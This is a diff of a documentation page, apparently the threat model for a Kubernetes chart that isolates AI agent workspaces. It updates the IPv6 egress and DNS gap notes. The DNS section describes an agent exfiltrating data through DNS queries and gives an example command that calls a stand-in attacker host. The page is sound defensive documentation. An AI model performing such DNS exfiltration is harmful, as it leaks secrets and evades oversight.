@@ -2637,23 +2637,17 @@
 <p>The default is <code>false</code> because the user-traffic source is deployment-specific (ingress controller labels vary) and a wrong allowlist would lock users out. This policy is defense-in-depth, not the primary control. Enable it after confirming the ingress source selector matches your environment.</p>
 <hr />
 <h2 id="ipv6-caveats">IPv6 caveats<a class="headerlink" href="#ipv6-caveats" title="Permanent link">&para;</a></h2>
-<div class="admonition warning">
-<p class="admonition-title">IPv6 egress is not restricted (gap G43)</p>
-<p>The workspace egress NetworkPolicy's CIDR allowlist uses <code>0.0.0.0/0</code> (IPv4) only. IPv6 <code>::/0</code> is <strong>unrestricted</strong>. On dual-stack clusters, a workspace pod with an IPv6 address can egress to any IPv6 destination, including RFC1918-equivalent ranges (<code>fc00::/7</code> ULA, <code>fe80::/10</code> link-local).</p>
+<div class="admonition info">
+<p class="admonition-title">IPv6 egress is denied by default (G43 resolved)</p>
+<p>The workspace egress NetworkPolicy has <code>policyTypes: [Egress]</code>, which default-denies ALL egress not explicitly allowed. The <code>allowedEgressCIDRs: [0.0.0.0/0]</code> matches IPv4 only (Kubernetes <code>ipBlock</code> CIDRs are address-family-specific). IPv6 traffic is denied by omission — no egress rule matches <code>::/0</code>.</p>
+<p><strong>If you need IPv6 egress</strong> (e.g. your LLM provider is IPv6-only), add <code>::/0</code> (with appropriate exceptions for ULA/link-local) to <code>networkPolicy.allowedEgressCIDRs</code> in your Helm values. Without that, workspace pods are effectively IPv4-only for external connectivity.</p>
 </div>
-<p>Mitigations:</p>
-<ul>
-<li>Run IPv4-only nodes for workspace scheduling (nodeSelector / taints).</li>
-<li>Add IPv6 rules via a CNI-native policy (Cilium, Calico) and disable the chart's workspaceEgress NP.</li>
-<li>Disable IPv6 on the workspace pod network if your CNI supports it.</li>
-</ul>
-<p>This is a known open gap; the platform assumes IPv4-only workspace networking by default.</p>
 <hr />
 <h2 id="dns-exfiltration">DNS exfiltration<a class="headerlink" href="#dns-exfiltration" title="Permanent link">&para;</a></h2>
 <p>DNS is allowed to kube-dns on port 53 (UDP/TCP). This is required for the workspace to resolve any external host on boot. The threat: an agent can encode exfiltrated data in DNS query names (e.g. <code>curl secret.attacker.com</code> or a DNS-tunneling client).</p>
 <h3 id="current-state">Current state<a class="headerlink" href="#current-state" title="Permanent link">&para;</a></h3>
 <ul>
-<li>The chart's egress NP allows port 53 to kube-dns <strong>and</strong> <code>0.0.0.0/0</code> (minus RFC1918) — so external DNS resolvers (e.g. <code>8.8.8.8:53</code>) are also reachable (gap G30, open). The two rules are OR-ed.</li>
+<li>The chart's egress NP allows port 53 to kube-dns <strong>and</strong> <code>0.0.0.0/0</code> (minus RFC1918) — so external DNS resolvers (e.g. <code>8.8.8.8:53</code>) are also reachable (gap G30, accepted — standard NetworkPolicy cannot restrict DNS by domain). The two rules are OR-ed.</li>
 <li>There is no DNS query body inspection. This is accepted residual risk (G14): no code path inspects outbound HTTP request bodies either.</li>
 </ul>
 <h3 id="operator-mitigations">Operator mitigations<a class="headerlink" href="#operator-mitigations" title="Permanent link">&para;</a></h3>
@@ -2811,7 +2805,7 @@
     <span class="md-icon" title="Last update">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
     </span>
-    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 11, 2026 06:44:10 UTC"><span class="timeago" datetime="2026-07-11T06:44:10+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 11, 2026 06:44:10 UTC">2026-07-11</span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="July 12, 2026 06:28:58 UTC"><span class="timeago" datetime="2026-07-12T06:28:58+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="July 12, 2026 06:28:58 UTC">2026-07-12</span>
   </span>
 
     
